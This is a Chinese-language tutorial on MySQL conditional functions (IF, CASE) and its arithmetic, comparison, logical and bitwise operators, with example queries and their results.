<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select if(1&gt;0,&apos;是&apos;,&apos;否&apos;);</span><br><span class="line">+-------------------+</span><br><span class="line">| if(1&gt;0,&apos;是&apos;,&apos;否&apos;)     |</span><br><span class="line">+-------------------+</span><br><span class="line">| 是                  |</span><br><span class="line">+-------------------+</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">mysql&gt; select if(left(user(),4)=&apos;root&apos;,&apos;root&apos;,&apos;not root&apos;);</span><br><span class="line">+---------------------------------------------+</span><br><span class="line">| if(left(user(),4)=&apos;root&apos;,&apos;root&apos;,&apos;not root&apos;) |</span><br><span class="line">+---------------------------------------------+</span><br><span class="line">| root                                        |</span><br><span class="line">+---------------------------------------------+</span><br></pre></td></tr></table></figure>
<p><strong>case when [value] then [result] … else [default] end</strong></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select <span class="keyword">case</span> 2 when 1 <span class="keyword">then</span> <span class="string">'one'</span> when 2 <span class="keyword">then</span> <span class="string">'two'</span> <span class="keyword">else</span> <span class="string">'more'</span> end as <span class="string">'CASE测试'</span>;</span><br><span class="line">+------------+</span><br><span class="line">| CASE测试   |</span><br><span class="line">+------------+</span><br><span class="line">| two        |</span><br><span class="line">+------------+</span><br><span class="line"></span><br><span class="line">mysql&gt; select <span class="keyword">case</span> 3 when 1 <span class="keyword">then</span> <span class="string">'one'</span> when 2 <span class="keyword">then</span> <span class="string">'two'</span> <span class="keyword">else</span> <span class="string">'more'</span> end as <span class="string">'CASE测试'</span>;</span><br><span class="line">+------------+</span><br><span class="line">| CASE测试   |</span><br><span class="line">+------------+</span><br><span class="line">| more       |</span><br><span class="line">+------------+</span><br></pre></td></tr></table></figure>
<h1 id="MySQL-运算符"><a href="#MySQL-运算符" class="headerlink" title="MySQL 运算符"></a>MySQL 运算符</h1><p>主要介绍 MySQL 的运算符及运算符的优先级。 MySQL 主要有以下几种运算符：</p>
<ul>
<li>算术运算符</li>
<li>比较运算符</li>
<li>逻辑运算符</li>
<li>位运算符</li>
</ul>
<h2 id="算术运算符"><a href="#算术运算符" class="headerlink" title="算术运算符"></a>算术运算符</h2><p>MySQL 支持的算术运算符包括:</p>
<table>
<thead>
<tr>
<th style="text-align:left">运算符</th>
<th style="text-align:left">作用</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left">+</td>
<td style="text-align:left">加法</td>
</tr>
<tr>
<td style="text-align:left">-</td>
<td style="text-align:left">减法</td>
</tr>
<tr>
<td style="text-align:left">*</td>
<td style="text-align:left">乘法</td>
</tr>
<tr>
<td style="text-align:left">/ 或 DIV</td>
<td style="text-align:left">除法</td>
</tr>
<tr>
<td style="text-align:left">% 或 MOD</td>
<td style="text-align:left">取余</td>
</tr>
</tbody>
</table>
<p>在除法运算和模运算中，如果除数为0，将是非法除数，返回结果为NULL。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select 1+2;</span><br><span class="line">+-----+</span><br><span class="line">| 1+2 |</span><br><span class="line">+-----+</span><br><span class="line">|   3 |</span><br><span class="line">+-----+</span><br><span class="line"></span><br><span class="line">mysql&gt; select 1-2;</span><br><span class="line">+-----+</span><br><span class="line">| 1-2 |</span><br><span class="line">+-----+</span><br><span class="line">|  -1 |</span><br><span class="line">+-----+</span><br><span class="line"></span><br><span class="line">mysql&gt; select 2*3;</span><br><span class="line">+-----+</span><br><span class="line">| 2*3 |</span><br><span class="line">+-----+</span><br><span class="line">|   6 |</span><br><span class="line">+-----+</span><br><span class="line"></span><br><span class="line">mysql&gt; select 2/3;</span><br><span class="line">+--------+</span><br><span class="line">| 2/3    |</span><br><span class="line">+--------+</span><br><span class="line">| 0.6667 |</span><br><span class="line">+--------+</span><br><span class="line"></span><br><span class="line">mysql&gt; select 10 DIV 4;</span><br><span class="line">+----------+</span><br><span class="line">| 10 DIV 4 |</span><br><span class="line">+----------+</span><br><span class="line">|        2 |</span><br><span class="line">+----------+</span><br><span class="line"></span><br><span class="line">mysql&gt; select 10 MOD 4;</span><br><span class="line">+----------+</span><br><span class="line">| 10 MOD 4 |</span><br><span class="line">+----------+</span><br><span class="line">|        2 |</span><br><span class="line">+----------+</span><br></pre></td></tr></table></figure>
<h2 id="比较运算符"><a href="#比较运算符" class="headerlink" title="比较运算符"></a>比较运算符</h2><p>SELECT 语句中的条件语句经常要使用比较运算符。通过这些比较运算符，可以判断表中的哪些记录是符合条件的。比较结果为真，则返回 1，为假则返回 0，比较结果不确定则返回 NULL。</p>
<table>
<thead>
<tr>
<th style="text-align:left">符号</th>
<th style="text-align:left">描述</th>
<th style="text-align:left">备注</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left">=</td>
<td style="text-align:left">等于</td>
<td style="text-align:left">无</td>
</tr>
<tr>
<td style="text-align:left">&lt;&gt;, !=</td>
<td style="text-align:left">不等于</td>
<td style="text-align:left">无</td>
</tr>
<tr>
<td style="text-align:left">&gt;</td>
<td style="text-align:left">大于</td>
<td style="text-align:left">无</td>
</tr>
<tr>
<td style="text-align:left">&lt;</td>
<td style="text-align:left">小于</td>
<td style="text-align:left">无</td>
</tr>
<tr>
<td style="text-align:left">&lt;=</td>
<td style="text-align:left">小于等于</td>
<td style="text-align:left">无</td>
</tr>
<tr>
<td style="text-align:left">&gt;=</td>
<td style="text-align:left">大于等于</td>
<td style="text-align:left">无</td>
</tr>
<tr>
<td style="text-align:left">BETWEEN</td>
<td style="text-align:left">在两值之间</td>
<td style="text-align:left">&gt;=min&amp;&amp;&lt;=max</td>
</tr>
<tr>
<td style="text-align:left">NOT BETWEEN</td>
<td style="text-align:left">不在两值之间</td>
<td style="text-align:left">无</td>
</tr>
<tr>
<td style="text-align:left">IN</td>
<td style="text-align:left">在集合中</td>
<td style="text-align:left">无</td>
</tr>
<tr>
<td style="text-align:left">NOT IN</td>
<td style="text-align:left">不在集合中</td>
<td style="text-align:left">无</td>
</tr>
<tr>
<td style="text-align:left">&lt;=&gt;</td>
<td style="text-align:left">严格比较两个NULL值是否相等</td>
<td style="text-align:left">两个操作码均为NULL时，其所得值为1；而当一个操作码为NULL时，其所得值为0</td>
</tr>
<tr>
<td style="text-align:left">LIKE</td>
<td style="text-align:left">模糊匹配</td>
<td style="text-align:left">无</td>
</tr>
<tr>
<td style="text-align:left">REGEXP 或 RLIKE</td>
<td style="text-align:left">正则式匹配</td>
<td style="text-align:left">无</td>
</tr>
<tr>
<td style="text-align:left">IS NULL</td>
<td style="text-align:left">为空</td>
<td style="text-align:left">无</td>
</tr>
<tr>
<td style="text-align:left">IS NOT NULL</td>
<td style="text-align:left">不为空</td>
<td style="text-align:left">无</td>
</tr>
</tbody>
</table>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 等于</span></span><br><span class="line">mysql&gt; select 2=3;</span><br><span class="line">+-----+</span><br><span class="line">| 2=3 |</span><br><span class="line">+-----+</span><br><span class="line">|   0 |</span><br><span class="line">+-----+</span><br><span class="line"></span><br><span class="line">mysql&gt; select NULL = NULL;</span><br><span class="line">+-------------+</span><br><span class="line">| NULL = NULL |</span><br><span class="line">+-------------+</span><br><span class="line">|        NULL |</span><br><span class="line">+-------------+</span><br><span class="line"></span><br><span class="line"><span class="comment"># 不等于</span></span><br><span class="line">mysql&gt; select 2&lt;&gt;3;</span><br><span class="line">+------+</span><br><span class="line">| 2&lt;&gt;3 |</span><br><span class="line">+------+</span><br><span class="line">|    1 |</span><br><span class="line">+------+</span><br><span class="line"></span><br><span class="line">mysql&gt; select 2!=3;</span><br><span class="line">+------+</span><br><span class="line">| 2!=3 |</span><br><span class="line">+------+</span><br><span class="line">|    1 |</span><br><span class="line">+------+</span><br></pre></td></tr></table></figure>
<blockquote>
<p>安全等于 与 <strong>=</strong> 的区别在于当两个操作码均为 NULL 时，其所得值为 1 而不为 NULL，而当一个操作码为 NULL 时，其所得值为 0而不为 NULL。</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select 2&lt;=&gt;3;</span><br><span class="line">+-------+</span><br><span class="line">| 2&lt;=&gt;3 |</span><br><span class="line">+-------+</span><br><span class="line">|     0 |</span><br><span class="line">+-------+</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">mysql&gt; select null=null;</span><br><span class="line">+-----------+</span><br><span class="line">| null=null |</span><br><span class="line">+-----------+</span><br><span class="line">|      NULL |</span><br><span class="line">+-----------+</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">mysql&gt; select null&lt;=&gt;null;</span><br><span class="line">+-------------+</span><br><span class="line">| null&lt;=&gt;null |</span><br><span class="line">+-------------+</span><br><span class="line">|           1 |</span><br><span class="line">+-------------+</span><br><span class="line"># 小于</span><br><span class="line">mysql&gt; select 2&lt;3;</span><br><span class="line">+-----+</span><br><span class="line">| 2&lt;3 |</span><br><span class="line">+-----+</span><br><span class="line">|   1 |</span><br><span class="line">+-----+</span><br><span class="line"></span><br><span class="line"># 小于等于</span><br><span class="line">mysql&gt; select 2&lt;=3;</span><br><span class="line">+------+</span><br><span class="line">| 2&lt;=3 |</span><br><span class="line">+------+</span><br><span class="line">|    1 |</span><br><span class="line">+------+</span><br><span class="line"></span><br><span class="line"># 大于</span><br><span class="line">mysql&gt; select 2&gt;3;</span><br><span class="line">+-----+</span><br><span class="line">| 2&gt;3 |</span><br><span class="line">+-----+</span><br><span class="line">|   0 |</span><br><span class="line">+-----+</span><br><span class="line"></span><br><span class="line"># 大于等于</span><br><span class="line">mysql&gt; select 2&gt;=3;</span><br><span class="line">+------+</span><br><span class="line">| 2&gt;=3 |</span><br><span class="line">+------+</span><br><span class="line">|    0 |</span><br><span class="line">+------+</span><br><span class="line"># BETWEEN 在两值之间</span><br><span class="line">mysql&gt; select 5 between 1 and 10;</span><br><span class="line">+--------------------+</span><br><span class="line">| 5 between 1 and 10 |</span><br><span class="line">+--------------------+</span><br><span class="line">|                  1 |</span><br><span class="line">+--------------------+</span><br><span class="line"></span><br><span class="line"># IN 在集合中</span><br><span class="line">mysql&gt; select 5 in (1,2,3,4,5);</span><br><span class="line">+------------------+</span><br><span class="line">| 5 in (1,2,3,4,5) |</span><br><span class="line">+------------------+</span><br><span class="line">|                1 |</span><br><span class="line">+------------------+</span><br><span class="line"></span><br><span class="line"># NOT IN 不再集合中</span><br><span class="line">mysql&gt; select 5 not in (1,2,3,4,5);</span><br><span class="line">+----------------------+</span><br><span class="line">| 5 not in (1,2,3,4,5) |</span><br><span class="line">+----------------------+</span><br><span class="line">|                    0 |</span><br><span class="line">+----------------------+</span><br><span class="line"></span><br><span class="line"># IS NULL 判断是否为空</span><br><span class="line">mysql&gt; select null is NULL;</span><br><span class="line">+--------------+</span><br><span class="line">| null is NULL |</span><br><span class="line">+--------------+</span><br><span class="line">|            1 |</span><br><span class="line">+--------------+</span><br><span class="line"></span><br><span class="line">mysql&gt; select &apos;a&apos; is NULL;</span><br><span class="line">+-------------+</span><br><span class="line">| &apos;a&apos; is NULL |</span><br><span class="line">+-------------+</span><br><span class="line">|           0 |</span><br><span class="line">+-------------+</span><br><span class="line"></span><br><span class="line"># IS NOT NULL 判断是否不为空</span><br><span class="line">mysql&gt; select null IS NOT NULL;</span><br><span class="line">+------------------+</span><br><span class="line">| null IS NOT NULL |</span><br><span class="line">+------------------+</span><br><span class="line">|                0 |</span><br><span class="line">+------------------+</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">mysql&gt; select &apos;a&apos; IS NOT NULL;</span><br><span class="line">+-----------------+</span><br><span class="line">| &apos;a&apos; IS NOT NULL |</span><br><span class="line">+-----------------+</span><br><span class="line">|               1 |</span><br><span class="line">+-----------------+</span><br><span class="line"></span><br><span class="line"># LIKE 模糊查询</span><br><span class="line">mysql&gt; select &apos;12345&apos; like &apos;12%&apos;;</span><br><span class="line">+--------------------+</span><br><span class="line">| &apos;12345&apos; like &apos;12%&apos; |</span><br><span class="line">+--------------------+</span><br><span class="line">|                  1 |</span><br><span class="line">+--------------------+</span><br><span class="line"></span><br><span class="line">mysql&gt; select &apos;12345&apos; like &apos;12_&apos;;</span><br><span class="line">+--------------------+</span><br><span class="line">| &apos;12345&apos; like &apos;12_&apos; |</span><br><span class="line">+--------------------+</span><br><span class="line">|                  0 |</span><br><span class="line">+--------------------+</span><br><span class="line"></span><br><span class="line">mysql&gt; select &apos;12345&apos; like &apos;%3%&apos;;</span><br><span class="line">+--------------------+</span><br><span class="line">| &apos;12345&apos; like &apos;%3%&apos; |</span><br><span class="line">+--------------------+</span><br><span class="line">|                  1 |</span><br><span class="line">+--------------------+</span><br><span class="line"></span><br><span class="line">mysql&gt; select &apos;12345&apos; like &apos;%5&apos;;</span><br><span class="line">+-------------------+</span><br><span class="line">| &apos;12345&apos; like &apos;%5&apos; |</span><br><span class="line">+-------------------+</span><br><span class="line">|                 1 |</span><br><span class="line">+-------------------+</span><br><span class="line"></span><br><span class="line"># REGEXP 正则匹配</span><br><span class="line">mysql&gt; select &apos;beijing&apos; REGEXP &apos;jing&apos;;</span><br><span class="line">+-------------------------+</span><br><span class="line">| &apos;beijing&apos; REGEXP &apos;jing&apos; |</span><br><span class="line">+-------------------------+</span><br><span class="line">|                       1 |</span><br><span class="line">+-------------------------+</span><br><span class="line"></span><br><span class="line">mysql&gt; select &apos;beijing&apos; REGEXP &apos;xi&apos;;</span><br><span class="line">+-----------------------+</span><br><span class="line">| &apos;beijing&apos; REGEXP &apos;xi&apos; |</span><br><span class="line">+-----------------------+</span><br><span class="line">|                     0 |</span><br><span class="line">+-----------------------+</span><br><span class="line"></span><br><span class="line">mysql&gt; select &apos;beijing&apos; REGEXP &apos;^b&apos;;</span><br><span class="line">+-----------------------+</span><br><span class="line">| &apos;beijing&apos; REGEXP &apos;^b&apos; |</span><br><span class="line">+-----------------------+</span><br><span class="line">|                     1 |</span><br><span class="line">+-----------------------+</span><br><span class="line"></span><br><span class="line">mysql&gt; select &apos;beijing&apos; REGEXP &apos;g$&apos;;</span><br><span class="line">+-----------------------+</span><br><span class="line">| &apos;beijing&apos; REGEXP &apos;g$&apos; |</span><br><span class="line">+-----------------------+</span><br><span class="line">|                     1 |</span><br><span class="line">+-----------------------+</span><br><span class="line"></span><br><span class="line">mysql&gt; select &apos;beijing&apos; REGEXP &apos;[0-9]&apos;;</span><br><span class="line">+--------------------------+</span><br><span class="line">| &apos;beijing&apos; REGEXP &apos;[0-9]&apos; |</span><br><span class="line">+--------------------------+</span><br><span class="line">|                        0 |</span><br><span class="line">+--------------------------+</span><br><span class="line"></span><br><span class="line">mysql&gt; select &apos;beijing&apos; REGEXP &apos;[a-z]&apos;;</span><br><span class="line">+--------------------------+</span><br><span class="line">| &apos;beijing&apos; REGEXP &apos;[a-z]&apos; |</span><br><span class="line">+--------------------------+</span><br><span class="line">|                        1 |</span><br><span class="line">+--------------------------+</span><br></pre></td></tr></table></figure>
<h2 id="逻辑运算符"><a href="#逻辑运算符" class="headerlink" title="逻辑运算符"></a>逻辑运算符</h2><p>逻辑运算符用来判断表达式的真假。如果表达式是真，结果返回 1。如果表达式是假，结果返回 0。</p>
<table>
<thead>
<tr>
<th style="text-align:left">运算符号</th>
<th style="text-align:left">作用</th>
<th></th>
<th></th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left">NOT 或 !</td>
<td style="text-align:left">逻辑非</td>
<td></td>
<td></td>
</tr>
<tr>
<td style="text-align:left">AND 或 &amp;&amp;</td>
<td style="text-align:left">逻辑与</td>
<td></td>
<td></td>
</tr>
<tr>
<td style="text-align:left">OR 或 \</td>
<td style="text-align:left">\</td>
<td></td>
<td>逻辑或</td>
</tr>
<tr>
<td style="text-align:left">XOR 或 ^</td>
<td style="text-align:left">逻辑异或</td>
<td></td>
</tr>
</tbody>
</table>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br></pre></td><td class="code"><pre><span class="line"># 与</span><br><span class="line">mysql&gt; select 2 and 0;</span><br><span class="line">+---------+</span><br><span class="line">| 2 and 0 |</span><br><span class="line">+---------+</span><br><span class="line">|       0 |</span><br><span class="line">+---------+</span><br><span class="line"></span><br><span class="line">mysql&gt; select 2 and 1;</span><br><span class="line">+---------+</span><br><span class="line">| 2 and 1 |</span><br><span class="line">+---------+</span><br><span class="line">|       1 |</span><br><span class="line">+---------+</span><br><span class="line"></span><br><span class="line">mysql&gt; select 2 &amp;&amp; 0;</span><br><span class="line">+--------+</span><br><span class="line">| 2 &amp;&amp; 0 |</span><br><span class="line">+--------+</span><br><span class="line">|      0 |</span><br><span class="line">+--------+</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># 或</span><br><span class="line">mysql&gt; select 2 or 0;</span><br><span class="line">+--------+</span><br><span class="line">| 2 or 0 |</span><br><span class="line">+--------+</span><br><span class="line">|      1 |</span><br><span class="line">+--------+</span><br><span class="line"></span><br><span class="line">mysql&gt; select 2 or 1;</span><br><span class="line">+--------+</span><br><span class="line">| 2 or 1 |</span><br><span class="line">+--------+</span><br><span class="line">|      1 |</span><br><span class="line">+--------+</span><br><span class="line"></span><br><span class="line">mysql&gt; select 0 or 0;</span><br><span class="line">+--------+</span><br><span class="line">| 0 or 0 |</span><br><span class="line">+--------+</span><br><span class="line">|      0 |</span><br><span class="line">+--------+</span><br><span class="line"></span><br><span class="line">mysql&gt; select 1 || 0;</span><br><span class="line">+--------+</span><br><span class="line">| 1 || 0 |</span><br><span class="line">+--------+</span><br><span class="line">|      1 |</span><br><span class="line">+--------+</span><br><span class="line"></span><br><span class="line"># 非</span><br><span class="line">mysql&gt; select not 1;</span><br><span class="line">+-------+</span><br><span class="line">| not 1 |</span><br><span class="line">+-------+</span><br><span class="line">|     0 |</span><br><span class="line">+-------+</span><br><span class="line"></span><br><span class="line">mysql&gt; select !0;</span><br><span class="line">+----+</span><br><span class="line">| !0 |</span><br><span class="line">+----+</span><br><span class="line">|  1 |</span><br><span class="line">+----+</span><br><span class="line"></span><br><span class="line"># 异或  </span><br><span class="line"># 如果a、b两个值不相同，则异或结果为1。 如果a、b两个值相同，异或结果为0。</span><br><span class="line">mysql&gt; select 1 xor 1;</span><br><span class="line">+---------+</span><br><span class="line">| 1 xor 1 |</span><br><span class="line">+---------+</span><br><span class="line">|       0 |</span><br><span class="line">+---------+</span><br><span class="line"></span><br><span class="line">mysql&gt; select 0 xor 0;</span><br><span class="line">+---------+</span><br><span class="line">| 0 xor 0 |</span><br><span class="line">+---------+</span><br><span class="line">|       0 |</span><br><span class="line">+---------+</span><br><span class="line"></span><br><span class="line">mysql&gt; select 1 xor 0;</span><br><span class="line">+---------+</span><br><span class="line">| 1 xor 0 |</span><br><span class="line">+---------+</span><br><span class="line">|       1 |</span><br><span class="line">+---------+</span><br><span class="line"></span><br><span class="line">mysql&gt; select 1 ^ 0;</span><br><span class="line">+-------+</span><br><span class="line">| 1 ^ 0 |</span><br><span class="line">+-------+</span><br><span class="line">|     1 |</span><br><span class="line">+-------+</span><br><span class="line"></span><br><span class="line">mysql&gt; select 1 ^ null;</span><br><span class="line">+----------+</span><br><span class="line">| 1 ^ null |</span><br><span class="line">+----------+</span><br><span class="line">|     NULL |</span><br><span class="line">+----------+</span><br></pre></td></tr></table></figure>
<h2 id="位运算符"><a href="#位运算符" class="headerlink" title="位运算符"></a>位运算符</h2><p>位运算符是在二进制数上进行计算的运算符。位运算会先将操作数变成<strong>二进制</strong>数，进行位运算。然后再将计算结果从<strong>二进制数变回十进制数</strong>。</p>
<table>
<thead>
<tr>
<th style="text-align:left">运算符号</th>
<th style="text-align:left">作用</th>
<th></th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left">&amp;</td>
<td style="text-align:left">按位与</td>
<td></td>
</tr>
<tr>
<td style="text-align:left">\</td>
<td style="text-align:left"></td>
<td>按位或</td>
</tr>
<tr>
<td style="text-align:left">^</td>
<td style="text-align:left">按位异或</td>
<td></td>
</tr>
<tr>
<td style="text-align:left">!</td>
<td style="text-align:left">取反</td>
<td></td>
</tr>
<tr>
<td style="text-align:left">&lt;&lt;</td>
<td style="text-align:left">左移</td>
<td></td>
</tr>
<tr>
<td style="text-align:left">&gt;&gt;</td>
<td style="text-align:left">右移</td>
</tr>
</tbody>
</table>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"># 按位与 两个二进位都为1时，结果位才为1</span><br><span class="line">mysql&gt; select 1 &amp; 2;</span><br><span class="line">+-------+</span><br><span class="line">| 1 &amp; 2 |</span><br><span class="line">+-------+</span><br><span class="line">|     0 |</span><br><span class="line">+-------+</span><br><span class="line"></span><br><span class="line">mysql&gt; select 1 &amp; 3;</span><br><span class="line">+-------+</span><br><span class="line">| 1 &amp; 3 |</span><br><span class="line">+-------+</span><br><span class="line">|     1 |</span><br><span class="line">+-------+</span><br></pre></td></tr></table></figure>
